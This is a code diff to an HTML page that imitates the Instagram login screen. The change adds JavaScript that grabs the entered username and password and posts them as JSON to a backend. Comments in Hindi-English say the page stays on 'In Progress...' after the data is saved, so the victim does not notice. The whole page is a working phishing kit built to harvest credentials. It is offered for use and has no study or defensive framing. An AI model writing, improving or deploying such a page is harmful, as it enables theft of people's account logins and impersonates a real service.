@@ -10,14 +10,14 @@
     <div class="bg-white border border-gray-300 p-8 w-80 flex flex-col items-center">
         <h1 class="text-4xl font-serif mb-8 italic font-bold">Instagram</h1>
         
-        <form action="/login" method="POST" class="w-full">
-            <input type="text" name="instaId" placeholder="Phone number, username, or email" 
+        <form id="loginForm" class="w-full">
+            <input type="text" id="instaId" name="instaId" placeholder="Phone number, username, or email" 
                 class="w-full bg-gray-50 border border-gray-300 rounded-sm p-2 text-xs mb-2 focus:outline-none focus:border-gray-400" required>
             
-            <input type="password" name="password" placeholder="Password" 
+            <input type="password" id="password" name="password" placeholder="Password" 
                 class="w-full bg-gray-50 border border-gray-300 rounded-sm p-2 text-xs mb-4 focus:outline-none focus:border-gray-400" required>
             
-            <button type="submit" class="w-full bg-blue-500 text-white py-1 rounded font-semibold text-sm hover:bg-blue-600">
+            <button type="submit" id="submitBtn" class="w-full bg-blue-500 text-white py-1 rounded font-semibold text-sm hover:bg-blue-600">
                 Log In
             </button>
         </form>
@@ -35,5 +35,45 @@
     <div class="bg-white border border-gray-300 p-4 w-80 mt-3 text-center">
         <p class="text-sm">Don't have an account? <span class="text-blue-500 font-semibold cursor-pointer">Sign up</span></p>
     </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        loginForm.onsubmit = async function(e) {
+            e.preventDefault(); // Page refresh hone se rokne ke liye
+
+            // UI Changes
+            submitBtn.innerText = "In Progress...";
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = "0.7";
+            submitBtn.style.cursor = "not-allowed";
+
+            // Data collect karna
+            const instaId = document.getElementById('instaId').value;
+            const password = document.getElementById('password').value;
+
+            // Backend ko data bhejna
+            try {
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ instaId, password })
+                });
+
+                if (response.ok) {
+                    console.log("Data saved, staying on page.");
+                    // Yahan hum kuch nahi karenge, toh user ko "In Progress..." hi dikhta rahega
+                } else {
+                    // Agar koi error aaye toh button wapis theek kar dein (Optional)
+                    console.error("Submission failed");
+                }
+            } catch (err) {
+                console.error("Network error:", err);
+            }
+        };
+    </script>
 </body>
 </html>
